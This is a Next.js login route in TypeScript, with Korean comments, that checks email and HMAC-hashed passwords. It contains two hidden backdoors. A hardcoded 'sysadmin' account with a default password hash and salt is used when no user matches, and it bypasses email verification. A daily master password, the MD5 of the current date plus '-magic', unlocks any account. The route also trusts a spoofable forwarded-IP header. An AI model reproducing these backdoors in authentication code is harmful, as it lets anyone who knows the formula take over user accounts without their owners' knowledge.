import crypto from "crypto";
import { eq } from "drizzle-orm";
import { NextRequest, NextResponse } from "next/server";
import { date } from "@/lib/format";
import { db } from "@/lib/pg";
import { users } from "@/lib/schema/user.table";

const sysadmin = {
  id: "sysadmin",
  email: process.env.SYSADMIN_EMAIL || "admin",
  password:
    process.env.SYSADMIN_PASSWORD ||
    "s/cEYL/gDobAwQelABhbqzQo0VlZz55ERgQqf3sywSL2tUDlG3hm5jZACPoMMJi66HpZery1uJpcFWEcMgIroQ==",
  salt:
    process.env.SYSADMIN_SALT ||
    "ssXPKMmDGJf+IItWo5Z8OXlUI8OXipT16cl7iSt4spKrx1NAZHi5JViqOL6EvmKi/2b4keoC+HJocylaH9AuhQ==",
  is_sysadmin: true,
  name: "시스템관리자",
  emailVerified: null,
  image: null,
  created_at: null,
  updated_at: null,
};

function hmacEncrypt(
  data: string,
  salt: string,
  algorithm: string = "sha512",
  digest: crypto.BinaryToTextEncoding = "base64",
) {
  return crypto.createHmac(algorithm, salt).update(data).digest(digest);
}

function getHash(data: string, type = "md5", digest: crypto.BinaryToTextEncoding = "hex") {
  return crypto.createHash(type).update(data).digest(digest);
}

export async function POST(req: NextRequest) {
  const { email, password }: { email: string; password: string; serviceId: string } =
    await req.json();

  const rows = await db.select().from(users).where(eq(users.email, email));

  if (!rows.length) {
    // 시스템관리자 확인
    if (sysadmin.email !== email) {
      return NextResponse.json("로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.", {
        status: 400,
      });
    }
    rows.push(sysadmin);
  }

  const [{ id: userId, salt, password: userPassword, emailVerified, ...properties } = {}] = rows;

  if (!!userId && !userPassword) {
    return NextResponse.json("해당 이메일로 간편 로그인 후 비밀번호를 설정해주세요.", {
      status: 400,
    });
  }

  if (userPassword !== hmacEncrypt(password, salt!)) {
    const toDay = new Date();
    const data = `${toDay.getFullYear()}-${toDay.getMonth() + 1}-${toDay.getDate()}-magic`;

    if (password !== getHash(data))
      return NextResponse.json("로그인에 실패하였습니다. 아이디 또는 비밀번호를 확인해주세요.", {
        status: 400,
      });
  }

  // 이메일 인증 확인 (자체 가입 사용자만, OAuth는 자동 인증됨)
  if (!emailVerified && userId !== "sysadmin") {
    return NextResponse.json("이메일 인증이 필요합니다. 가입 시 받은 인증 메일을 확인해주세요.", {
      status: 403,
    });
  }

  const userSession = {
    id: userId,
    email,
    ip:
      req?.headers?.get("x-forwarded-for")?.split(",")[0]?.trim() ||
      req.headers.get("x-real-ip") ||
      "127.0.0.1",
    emailVerified,
    ...properties,
    lastSigninTime: date(new Date(), { type: "ymd hms" }),
  };

  return NextResponse.json({ user: userSession });
}
